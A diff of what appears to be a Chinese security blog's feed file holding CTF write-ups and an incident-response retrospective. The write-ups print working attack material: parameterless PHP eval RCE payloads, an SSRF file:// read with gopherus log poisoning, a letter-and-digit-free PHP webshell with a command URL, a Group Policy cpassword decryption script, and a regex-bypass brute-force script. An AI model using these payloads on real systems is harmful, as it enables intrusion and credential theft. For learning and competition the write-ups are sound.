-<pre><code class="php"> &lt;?php
-highlight_file(__FILE__);
-$code = $_GET[&#39;code&#39;];
-if (!empty($code)) {
-        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
-            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
-                    echo &#39;bye~&#39;;
-                } else {
-                    eval($code);
-                }
-            }
-        else {
-            echo &quot;No way!!!&quot;;
-        }
-}else {
-        echo &quot;No way!!!&quot;;
-    }
-No way!!!</code></pre>
-</li>
-<li><p>在一轮FUZZ之后我们可以得知有下面函数可用。(翻了好久，总共能过这个正则的有300多个函数吧)</p>
-<pre><code class="php">echo、implode、scandir、chr、strrev、uniqid、file、chdir、next、pos、end</code></pre>
-</li>
-<li><p>我们用字节跳动的无参数RCE知道，要读取目录那么就必须构造出<code>scandir(&#39;.&#39;)</code>,一轮无脑翻阅手册后可以知道uniqid()会生成一个唯一的临牌，但是呢，他后半部分是会变化的，那么我们将其翻转过来就能动态构造任意字符如：</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-for($i=0;$i&lt;1000;$i++)
-echo(chr(strrev(uniqid())));
-?&gt;</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727060052967.png" alt="img"></p>
-</li>
-<li><p>非常明显已经可以构造在不断刷新这个网页在某一时刻就能构造出来点<code>（.）</code>进而读取到目录，而这里正则只允许26个字母构成的函数，所以var_dump这种是不可能使用了，所以这里使用<code>echo、implode</code>将返回的数组变成字符串来读取。那么构造payload如下，使用burpsuite去爆破。</p>
-<pre><code class="php">echo(implode(scandir(chr(strrev(uniqid())))));</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727064105621.png" alt="img"></p>
-</li>
-<li><p>可以看到已经读取了当前目录下的文件列表吗，那么下面就是要读取上层目录下的index.php文件。首先读取一下上层目录的列表，我们从上读取当前目录可以知道返回的文件目录数组如下关系：</p>
-<pre><code class="php\">[0=&gt;&#39;.&#39;,1=&gt;&#39;..&#39;,3=&gt;&#39;index.php&#39;]</code></pre>
-</li>
-<li><p>那么我们要读取上层目录就需要构造<code>scandir(&#39;..&#39;)</code>,那么很明显我们获取第二个元素即可得到两点，构造payload如下：</p>
-<pre><code class="php">  echo(implode(scandir(next(scandir(chr(strrev(uniqid())))))));</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727066455027.png" alt="img"></p>
-</li>
-<li><p>从这里我们可以得知index.php在最后一个元素，那么我们可以使用end()直接获取到，但是要读取到这个文件我们首先需要先跳转到这个目录，那么可以这样构造,使用chdir向上跳转一个目录：</p>
-<pre><code class="php">chdir(next(scandir(chr(strrev(uniqid())))))</code></pre>
-</li>
-<li><p>读取文件呢，我们可以使用第一个payload读取到文件目录，然后使用end()函数去读取最后一个元素，进而读取文件。</p>
-<pre><code class="php">file(end(scandir(chr(strrev(uniqid()))))</code></pre>
-</li>
-<li><p>那么综合起来payload如下：</p>
-<pre><code class="php">echo(implode(file(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))))));</code></pre>
-</li>
-<li><p>但是这里存在一个问题，那就是两次去的值不一定都是点，那么就需要进行N次爆破，在某一时刻这两个值都取到点的时候那么就会读取成功。                                                                                                                                                                                                                                 </p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
-</li>
-</ul>
-<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><ul>
-<li><p>开头非常简单的ssrf，直接使用file:///协议即可读到内容</p>
-<pre><code class="php">&lt;?php
-highlight_file(__FILE__);
-$x = $_GET[&#39;x&#39;];
-$pos = strpos($x,&quot;php&quot;);
-if($pos){
-        exit(&quot;denied&quot;);
-}
-$ch = curl_init();
-curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
-curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
-$result = curl_exec($ch);
-echo $result; </code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/1572771550497.png" alt="img"></p>
-</li>
-<li><p>这里直接读flag.php,直接使用双url编码绕过</p>
-<pre><code class="php">index.php?x=file:///var/www/html/flag.p%2568p</code></pre>
-</li>
-</ul>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727716421531.png" alt="img"></p>
-<ul>
-<li><p>提示/etc/hosts</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719047413.png" alt="img"></p>
-</li>
-<li><p>发现内网地址，直接爆破内网，发现172.18.0.2返回提示有文件包含漏洞</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719455947.png" alt="img"></p>
-</li>
-<li><p>扫描这个主机开放的端口</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727720229388.png" alt="img"></p>
-</li>
-<li><p>发现25端口开放，这里可以联想到结合文件包含，使用 <code>gopherus</code> 污染日志文件从而达到RCE。使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus" target="_blank" rel="noopener"> gopherus </a>生成利用脚本。污染成功后使用文件包含即可rce，日志文件路径：</p>
-<pre><code class="php">/var/log/maillog
-/var/log/mail.log
-/var/adm/maillog
-/var/adm/syslog/mail.log</code></pre>
-</li>
-</ul>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724065385.png" alt="img"></p>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724916990.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>CTF比赛</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯应急响复盘</title>
-    <url>//articles/d522b80276.html</url>
-    <content><![CDATA[<h2 id="事中应急响应"><a href="#事中应急响应" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><p>对应急响应经验不足错误总结如下：</p>
-<p><strong>失误</strong>：</p>
-<ul>
-<li><p>操作频繁，导致shell命令覆盖，无法朔源黑客执行的哪些操作</p>
-</li>
-<li><p>web访问频繁，导致web日志存在大量自身ip地址导致审计困难。</p>
-</li>
-</ul>
-<p><strong>正确操作：</strong></p>
-<ul>
-<li><p>历史命令增加储存为1万条</p>
-<pre><code class="shell">sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre>
-</li>
-<li><p>给历史命令增加登录的IP地址、执行命令时间等信息</p>
-<p>在/etc/profile的文件尾部添加如下行数配置信息：</p>
-</li>
-</ul>
-<pre><code class="shell">######jiagu history xianshi#########
-USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`
-if [ &quot;$USER_IP&quot; = &quot;&quot; ]
-then
-USER_IP=`hostname`
-fi
-export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;
-shopt -s histappend
-export PROMPT_COMMAND=&quot;history -a&quot;
-######### jiagu history xianshi ##########</code></pre>
-<p>​    让配置生效</p>
-<pre><code class="sehll">source /etc/profile
+    <title>Zer0pts2020-Can you guess it?</title>
+    <url>//articles/d4f73bcb62.html</url>
+    <content><![CDATA[<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><pre><code class="php">&lt;?php
+include &#39;config.php&#39;; // FLAG is defined in config.php
 
-生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</code></pre>
-<ul>
-<li>开启<code>tcpdump</code>抓取流量到文件，以便使用<code>wireshark</code>分析</li>
-</ul>
-<h2 id="事中应急响应-1"><a href="#事中应急响应-1" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul>
-<li>从日志可以发现，黑客对网站的后台发起了大量登陆尝试</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692531384896.png" alt="img"></p>
-<h3 id="系统日志审计"><a href="#系统日志审计" class="headerlink" title="系统日志审计"></a>系统日志审计</h3><ul>
-<li><p>系统登陆日志储存在<code>var/log/auth.log</code>或者<code>var/log/secure</code>上。</p>
-</li>
-<li><p>查看日志成功登陆的IP、用户和时间</p>
-</li>
-</ul>
-<pre><code class="shell">grep &quot;Accepted &quot; auth.log | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></pre>
-<ul>
-<li>可以看到奇怪的用户名和奇怪的ip。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692542548454.png" alt="img"></p>
-<ul>
-<li>查看具有root权限的用户</li>
-</ul>
-<pre><code class="shell">awk -F: &#39;$3==0{print $1}&#39; /etc/passwd
-或者
-cat /etc/passwd
-查看uid=0的用户
+if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) {
+  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
+}
+
+if (isset($_GET[&#39;source&#39;])) {
+  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
+  exit();
+}
+
+$secret = bin2hex(random_bytes(64));
+if (isset($_POST[&#39;guess&#39;])) {
+  $guess = (string) $_POST[&#39;guess&#39;];
+  if (hash_equals($secret, $guess)) {
+    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
+  } else {
+    $message = &#39;Wrong.&#39;;
+  }
+}
+?&gt;</code></pre>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从源码得知flag在config.php中的一个常量中，要得到flag需要我们post一个值guess和随机生成的要预测和爆破基本没戏。但是可以发现 <code>highlight_file()</code> 里面的变量是可控的。那么我们可以看看<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code> 怎么才能得到我们想要的结果。我们从php.net可以得知：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200520150428.png" alt="微信图片_20200520150428"></p>
+<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 能够当前url的路径，而basename能够返回返回路径中文件名部分。</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154155.png" alt="微信截图_20200520154155"></p>
+<p>那我们不是可以传入<code>/index.php/config.php?souce</code> ？但是一条正则挡住了我们的去路：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154339.png" alt="微信截图_20200520154339"></p>
+<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p>我们还需要绕过</p>
+<pre><code class="php">preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></pre>
+<p>这种正则其实直接写个脚本去爆破即可，一般都是某个字符能够通过。</p>
+<pre><code class="python">import requests
+
+for i in range(0,255):
+    url=&quot;http://c3bedc5a-4535-41a4-9c5f-9a25eae15489.node3.buuoj.cn/index.php/config.php/%s?source&quot;%(chr(i))
+    r = requests.get(url)
+    if &#39;flag&#39; in r.text:
+        print(r.text)
 </code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693222606429.png" alt="img"></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692545388895.png" alt="img"></p>
-<ul>
-<li>可以得知存在特权的用户除了root还有mysq1，再查看auth.log日志可以直接看到，该用户是被黑客新添加的，而其登陆ip和第一次登陆时间也可以得知</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692546752738.png" alt="img"></p>
-<h3 id="系统进程审查"><a href="#系统进程审查" class="headerlink" title="系统进程审查"></a>系统进程审查</h3><ul>
-<li>查看所有进程信息，找到异常的程序名</li>
-</ul>
-<pre><code class="shell">ps aux</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693224572614.png" alt="img"></p>
-<ul>
-<li><p>或者使用findshell直接GUI查看进程信息<br><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693225252668.png" alt="img"></p>
-</li>
-<li><p>找到了一个非常奇怪的进程名</p>
-</li>
-</ul>
-<pre><code class="shell">xmr-stak-cpu</code></pre>
-<ul>
-<li>直接查看定时任务也可以看到该进程被启用的信息</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693239569853.png" alt="img"></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/1569323988668.png" alt="img"></p>
-<ul>
-<li>可以知挖矿病毒绝对路径<code>/etc/xmr-stak-cpu/bin/xmr-stak-cpu</code>,同时<code>bin/config.txt</code>存储了挖矿病毒的配置信息，可以直接得知挖矿病毒的钱包地址。</li>
-</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154931.png" alt="微信截图_20200520154931"></p>
 ]]></content>
       <categories>
         <category>CTF比赛</category>
@@ -4684,83 +4709,202 @@ p.interactive()
       </tags>
   </entry>
   <entry>
-    <title>Hard_Pentest_1 复现</title>
-    <url>//articles/d5850ed2ae.html</url>
-    <content><![CDATA[<h2 id="无数字字母的webshell"><a href="#无数字字母的webshell" class="headerlink" title="无数字字母的webshell"></a>无数字字母的webshell</h2><p>上传绕过，只需用短标签、P神的无数字字母的webshell绕过即可，上传文件名绕过因为是windows直接大小写绕过。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="php">&lt;?= $_=[] ?&gt; 
-&lt;?= $_=@&quot;$_&quot; ?&gt;
-&lt;?= $_=$_[(&#39;!&#39;==&#39;@&#39;)] ?&gt;
-
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ ?&gt;
-&lt;?= $_______ = &quot;_&quot;.$__ ?&gt;
-
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ ?&gt;
-&lt;?= $_______ .= $__ ?&gt;
-
-&lt;?= $__ = $_ ?&gt;
-&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++  ?&gt;
-&lt;?= $_______ .= $__  ?&gt;
-
-&lt;?= ${$_______}[&quot;_&quot;](${$_______}[&quot;__&quot;]) ?&gt;</code></pre>
-<h3 id="写小马："><a href="#写小马：" class="headerlink" title="写小马："></a>写小马：</h3><pre><code class="http">http://47.113.219.76/uploads/d8ffd2952b7416f6096c2481dfad4351/6539886cfe4730b929fa714a800aa44a_6.Php?_=system&amp;__=echo &quot;&lt;?php phpinfo()?&gt;&quot;&gt;&gt;1.php</code></pre>
-<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>上传cmd.exe后执行net user看到提示在<code>\\192.168.0.12\Hint</code></p>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200507032004.png" alt="20200507032004"></p>
-<p>看到一个压缩包里面有flag1和flag2的提示。</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200507032131.png" alt="20200507032131"></p>
-<h3 id="SYSVOL还原组策略中保存的密码"><a href="#SYSVOL还原组策略中保存的密码" class="headerlink" title="SYSVOL还原组策略中保存的密码"></a>SYSVOL还原组策略中保存的密码</h3><p>参考3gstudent的-<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">域渗透——利用SYSVOL还原组策略中保存的密码</a>。</p>
-<p>在域中，存在一个默认的共享路径：</p>
-<pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>这里的域可以在ipconfig /all下看到：</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200507022504.png" alt="20200507022504"></p>
-<p>直接访问如下地址</p>
-<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507022747.png" alt="20200507022747"></p>
-<p>找到对应的策略组id配置文件，如下的Group.xml</p>
-<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/Policies/{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}/Machine/Preferences/Groups/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507023026.png" alt="20200507023026"></p>
-<p>简单的来说就是：<code>\SYSVOL</code>路径中保存了域内用户的一些配置信息-&gt;找到<code>HintZip_Pass</code>用户的配置信息-&gt;然后找到AES256加密的密钥，由于微软已经公开了私钥，那么就可以把这个登录密钥还原出来-&gt;最后解出压缩包。下面的cpasswd就是加密的秘钥</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200507032239.png" alt="20200507032239"></p>
-<h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre><code class="powershell">function Get-DecryptedCpassword {
-    [CmdletBinding()]
-    Param (
-        [string] $Cpassword 
-    )
-
-    try {
-        #Append appropriate padding based on string length  
-        $Mod = ($Cpassword.length % 4)
-
-        switch ($Mod) {
-        &#39;1&#39; {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
-        &#39;2&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
-        &#39;3&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
+    <title>上海大学生联赛部分write up</title>
+    <url>//articles/d51d5193e2.html</url>
+    <content><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>​        把010编辑器放进010编辑器直接搜索就是了</p>
+<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><ul>
+<li><p>页面源码提示代码在<code>/code</code>并且flag在这个页面</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727051288542.png" alt="img"></p>
+</li>
+<li><p>代码和字节跳动的一道boring-code相似,但是过滤得更多</p>
+<pre><code class="php"> &lt;?php
+highlight_file(__FILE__);
+$code = $_GET[&#39;code&#39;];
+if (!empty($code)) {
+        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
+            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
+                    echo &#39;bye~&#39;;
+                } else {
+                    eval($code);
+                }
+            }
+        else {
+            echo &quot;No way!!!&quot;;
         }
+}else {
+        echo &quot;No way!!!&quot;;
+    }
+No way!!!</code></pre>
+</li>
+<li><p>在一轮FUZZ之后我们可以得知有下面函数可用。(翻了好久，总共能过这个正则的有300多个函数吧)</p>
+<pre><code class="php">echo、implode、scandir、chr、strrev、uniqid、file、chdir、next、pos、end</code></pre>
+</li>
+<li><p>我们用字节跳动的无参数RCE知道，要读取目录那么就必须构造出<code>scandir(&#39;.&#39;)</code>,一轮无脑翻阅手册后可以知道uniqid()会生成一个唯一的临牌，但是呢，他后半部分是会变化的，那么我们将其翻转过来就能动态构造任意字符如：</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+for($i=0;$i&lt;1000;$i++)
+echo(chr(strrev(uniqid())));
+?&gt;</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727060052967.png" alt="img"></p>
+</li>
+<li><p>非常明显已经可以构造在不断刷新这个网页在某一时刻就能构造出来点<code>（.）</code>进而读取到目录，而这里正则只允许26个字母构成的函数，所以var_dump这种是不可能使用了，所以这里使用<code>echo、implode</code>将返回的数组变成字符串来读取。那么构造payload如下，使用burpsuite去爆破。</p>
+<pre><code class="php">echo(implode(scandir(chr(strrev(uniqid())))));</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727064105621.png" alt="img"></p>
+</li>
+<li><p>可以看到已经读取了当前目录下的文件列表吗，那么下面就是要读取上层目录下的index.php文件。首先读取一下上层目录的列表，我们从上读取当前目录可以知道返回的文件目录数组如下关系：</p>
+<pre><code class="php\">[0=&gt;&#39;.&#39;,1=&gt;&#39;..&#39;,3=&gt;&#39;index.php&#39;]</code></pre>
+</li>
+<li><p>那么我们要读取上层目录就需要构造<code>scandir(&#39;..&#39;)</code>,那么很明显我们获取第二个元素即可得到两点，构造payload如下：</p>
+<pre><code class="php">  echo(implode(scandir(next(scandir(chr(strrev(uniqid())))))));</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727066455027.png" alt="img"></p>
+</li>
+<li><p>从这里我们可以得知index.php在最后一个元素，那么我们可以使用end()直接获取到，但是要读取到这个文件我们首先需要先跳转到这个目录，那么可以这样构造,使用chdir向上跳转一个目录：</p>
+<pre><code class="php">chdir(next(scandir(chr(strrev(uniqid())))))</code></pre>
+</li>
+<li><p>读取文件呢，我们可以使用第一个payload读取到文件目录，然后使用end()函数去读取最后一个元素，进而读取文件。</p>
+<pre><code class="php">file(end(scandir(chr(strrev(uniqid()))))</code></pre>
+</li>
+<li><p>那么综合起来payload如下：</p>
+<pre><code class="php">echo(implode(file(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))))));</code></pre>
+</li>
+<li><p>但是这里存在一个问题，那就是两次去的值不一定都是点，那么就需要进行N次爆破，在某一时刻这两个值都取到点的时候那么就会读取成功。                                                                                                                                                                                                                                 </p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
+</li>
+</ul>
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><ul>
+<li><p>开头非常简单的ssrf，直接使用file:///协议即可读到内容</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$x = $_GET[&#39;x&#39;];
+$pos = strpos($x,&quot;php&quot;);
+if($pos){
+        exit(&quot;denied&quot;);
+}
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+$result = curl_exec($ch);
+echo $result; </code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/1572771550497.png" alt="img"></p>
+</li>
+<li><p>这里直接读flag.php,直接使用双url编码绕过</p>
+<pre><code class="php">index.php?x=file:///var/www/html/flag.p%2568p</code></pre>
+</li>
+</ul>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727716421531.png" alt="img"></p>
+<ul>
+<li><p>提示/etc/hosts</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719047413.png" alt="img"></p>
+</li>
+<li><p>发现内网地址，直接爆破内网，发现172.18.0.2返回提示有文件包含漏洞</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719455947.png" alt="img"></p>
+</li>
+<li><p>扫描这个主机开放的端口</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727720229388.png" alt="img"></p>
+</li>
+<li><p>发现25端口开放，这里可以联想到结合文件包含，使用 <code>gopherus</code> 污染日志文件从而达到RCE。使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus" target="_blank" rel="noopener"> gopherus </a>生成利用脚本。污染成功后使用文件包含即可rce，日志文件路径：</p>
+<pre><code class="php">/var/log/maillog
+/var/log/mail.log
+/var/adm/maillog
+/var/adm/syslog/mail.log</code></pre>
+</li>
+</ul>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724065385.png" alt="img"></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724916990.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网杯应急响复盘</title>
+    <url>//articles/d522b80276.html</url>
+    <content><![CDATA[<h2 id="事中应急响应"><a href="#事中应急响应" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><p>对应急响应经验不足错误总结如下：</p>
+<p><strong>失误</strong>：</p>
+<ul>
+<li><p>操作频繁，导致shell命令覆盖，无法朔源黑客执行的哪些操作</p>
+</li>
+<li><p>web访问频繁，导致web日志存在大量自身ip地址导致审计困难。</p>
+</li>
+</ul>
+<p><strong>正确操作：</strong></p>
+<ul>
+<li><p>历史命令增加储存为1万条</p>
+<pre><code class="shell">sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></pre>
+</li>
+<li><p>给历史命令增加登录的IP地址、执行命令时间等信息</p>
+<p>在/etc/profile的文件尾部添加如下行数配置信息：</p>
+</li>
+</ul>
+<pre><code class="shell">######jiagu history xianshi#########
+USER_IP=`who -u am i 2&gt;/dev/null | awk &#39;{print $NF}&#39; | sed -e &#39;s/[()]//g&#39;`
+if [ &quot;$USER_IP&quot; = &quot;&quot; ]
+then
+USER_IP=`hostname`
+fi
+export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;
+shopt -s histappend
+export PROMPT_COMMAND=&quot;history -a&quot;
+######### jiagu history xianshi ##########</code></pre>
+<p>​    让配置生效</p>
+<pre><code class="sehll">source /etc/profile
 
-
-        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
-
-        #Create a new AES .NET Crypto Object
-        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
-        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
-                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
-
-        #Set IV to all nulls to prevent dynamic generation of IV value
-        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
-        $AesObject.IV = $AesIV
-        $AesObject.Key = $AesKey
-        $DecryptorObject = $AesObject.CreateDecryptor() 
-        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
-
-        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
-    } 
-
-    catch {Write-Error $Error[0]}
-}  
-Get-DecryptedCpassword &quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</code></pre>
-<p>执行：</p>
-<pre><code>powershell -executionpolicy bypass -file 1.ps1</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507032803.png" alt="20200507032803"></p>
-<p>压缩包的密码是：<code>zL1PpP@sSwO3d</code></p>
-<p>得到flag:</p>
-<p><img src="http://goodcheerleung.gitee.io/blog/20200507032939.png" alt="20200507032939"></p>
+生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</code></pre>
+<ul>
+<li>开启<code>tcpdump</code>抓取流量到文件，以便使用<code>wireshark</code>分析</li>
+</ul>
+<h2 id="事中应急响应-1"><a href="#事中应急响应-1" class="headerlink" title="事中应急响应"></a>事中应急响应</h2><h3 id="web日志审计"><a href="#web日志审计" class="headerlink" title="web日志审计"></a>web日志审计</h3><ul>
+<li>从日志可以发现，黑客对网站的后台发起了大量登陆尝试</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692531384896.png" alt="img"></p>
+<h3 id="系统日志审计"><a href="#系统日志审计" class="headerlink" title="系统日志审计"></a>系统日志审计</h3><ul>
+<li><p>系统登陆日志储存在<code>var/log/auth.log</code>或者<code>var/log/secure</code>上。</p>
+</li>
+<li><p>查看日志成功登陆的IP、用户和时间</p>
+</li>
+</ul>
+<pre><code class="shell">grep &quot;Accepted &quot; auth.log | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></pre>
+<ul>
+<li>可以看到奇怪的用户名和奇怪的ip。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190923/15692542548454.png" alt="img"></p>
+<ul>
+<li>查看具有root权限的用户</li>
+</ul>
+<pre><code class="shell">awk -F: &#39;$3==0{print $1}&#39; /etc/passwd
+或者
+cat /etc/passwd
+查看uid=0的用户
+</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693222606429.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692545388895.png" alt="img"></p>
+<ul>
+<li>可以得知存在特权的用户除了root还有mysq1，再查看auth.log日志可以直接看到，该用户是被黑客新添加的，而其登陆ip和第一次登陆时间也可以得知</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15692546752738.png" alt="img"></p>
+<h3 id="系统进程审查"><a href="#系统进程审查" class="headerlink" title="系统进程审查"></a>系统进程审查</h3><ul>
+<li>查看所有进程信息，找到异常的程序名</li>
+</ul>
+<pre><code class="shell">ps aux</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693224572614.png" alt="img"></p>
+<ul>
+<li><p>或者使用findshell直接GUI查看进程信息<br><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693225252668.png" alt="img"></p>
+</li>
+<li><p>找到了一个非常奇怪的进程名</p>
+</li>
+</ul>
+<pre><code class="shell">xmr-stak-cpu</code></pre>
